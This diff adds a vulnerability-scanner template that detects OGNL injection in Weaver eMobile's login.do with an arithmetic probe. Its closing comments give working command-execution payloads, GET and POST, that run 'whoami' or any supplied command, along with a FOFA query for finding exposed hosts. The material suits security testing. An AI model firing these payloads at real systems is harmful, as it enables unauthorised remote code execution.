@@ -1,0 +1,44 @@
+id: fanweiOA-E-Mobile-login_do-OGNL-sql-injection
+
+info:
+  name: 泛微 eMobile - OGNL Injection
+  author: cnaq
+  severity: high
+  description: 泛微e-mobile ognl表达式注入，可执行命令,v6.5\v5.5
+  reference:
+    - https://gitee.com/cute-guy/Penetration_Testing_POC/blob/master/%E6%B3%9B%E5%BE%AEe-mobile%20ognl%E6%B3%A8%E5%85%A5.md
+    - https://reconshell.com/vulnerability-research-list/
+  metadata:
+    verified: true
+    fofa-query: app="泛微-eMobile"
+  tags: fanwei,oa,emobile,ognl
+
+variables:
+  num1: "9999"
+  num2: "5555"
+
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}/login.do?message={{num1}}*{{num2}}"
+      - "{{BaseURL}}/login/login.do?message={{num1}}*{{num2}}"
+
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '55544445'
+
+      - type: status
+        status:
+          - 200
+
+# Enhanced by mp on 2022/09/30
+
+# GET执行命令
+# message=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('whoami').getInputStream())
+
+# 也可以通过`post`提交数据来进行注入，命令执行
+# message=(#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#w=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse").getWriter()).(#w.print(@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(#parameters.cmd[0]).getInputStream()))).(#w.close())&cmd=whoami
